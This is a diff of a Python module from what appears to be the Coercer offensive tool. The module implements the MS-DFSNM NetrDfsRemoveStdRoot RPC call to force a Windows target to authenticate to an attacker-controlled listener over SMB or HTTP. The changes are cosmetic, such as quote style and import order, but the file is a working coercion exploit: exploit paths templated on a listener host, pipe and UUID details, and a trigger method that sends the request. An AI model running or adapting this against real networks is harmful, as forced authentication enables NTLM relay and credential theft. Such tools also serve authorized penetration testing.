@@ -4,22 +4,23 @@
 # Author             : Podalirius (@podalirius_)
 # Date created       : 14 Sep 2022
 
-from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
-from coercer.network.DCERPCSessionError import DCERPCSessionError
+from impacket.dcerpc.v5.dtypes import DWORD, WSTR
+from impacket.dcerpc.v5.ndr import NDRCALL
+
 from coercer.core.utils import gen_random_name
-from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
-from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
+from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
 
 
 class _NetrDfsRemoveStdRoot(NDRCALL):
     """
     Structure to make the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol
     """
+
     opnum = 13
     structure = (
-        ('ServerName', WSTR),  # Type: WCHAR *
-        ('RootShare', WSTR),   # Type: WCHAR *
-        ('ApiFlags', DWORD)    # Type: DWORD
+        ("ServerName", WSTR),  # Type: WCHAR *
+        ("RootShare", WSTR),  # Type: WCHAR *
+        ("ApiFlags", DWORD),  # Type: DWORD
     )
 
 
@@ -27,6 +28,7 @@ class _NetrDfsRemoveStdRootResponse(NDRCALL):
     """
     Structure to parse the response of the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol
     """
+
     structure = ()
 
 
@@ -39,10 +41,13 @@ class NetrDfsRemoveStdRoot(MSPROTOCOLRPCCALL):
     """
 
     exploit_paths = [
-        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
-        ("http", '\\\\{{listener}}{{http_listen_port}}/{{rnd(3)}}\\share\\file.txt\x00'),
+        ("smb", "\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00"),
+        ("smb", "\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00"),
+        ("smb", "\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00"),
+        (
+            "http",
+            "\\\\{{listener}}{{http_listen_port}}/{{rnd(3)}}\\share\\file.txt\x00",
+        ),
     ]
 
     access = {
@@ -50,41 +55,38 @@ class NetrDfsRemoveStdRoot(MSPROTOCOLRPCCALL):
             {
                 "namedpipe": r"\PIPE\netdfs",
                 "uuid": "4fc742e0-4a10-11cf-8273-00aa004ae673",
-                "version": "3.0"
+                "version": "3.0",
             }
         ],
         "ncacn_ip_tcp": [
-            {
-                "uuid": "4fc742e0-4a10-11cf-8273-00aa004ae673",
-                "version": "3.0"
-            }
-        ]
+            {"uuid": "4fc742e0-4a10-11cf-8273-00aa004ae673", "version": "3.0"}
+        ],
     }
 
     protocol = {
         "longname": "[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol",
-        "shortname": "MS-DFSNM"
+        "shortname": "MS-DFSNM",
     }
 
     function = {
         "name": "NetrDfsRemoveStdRoot",
         "opnum": 13,
-        "vulnerable_arguments": ["ServerName"]
+        "vulnerable_arguments": ["ServerName"],
     }
 
     def trigger(self, dcerpc_session, target):
         if dcerpc_session is not None:
             try:
                 request = _NetrDfsRemoveStdRoot()
-                request['ServerName'] = self.path
-                request['RootShare'] = gen_random_name() + '\x00'
-                request['ApiFlags'] = 0
-                resp = dcerpc_session.request(request)
+                request["ServerName"] = self.path
+                request["RootShare"] = gen_random_name() + "\x00"
+                request["ApiFlags"] = 0
+                dcerpc_session.request(request)
                 return ""
             except Exception as err:
                 return err
         else:
             from coercer.core.Reporter import reporter
-            from coercer.core.Reporter import reporter
+
             reporter.print_error("Error: dce is None, you must call connect() first.")
             return None
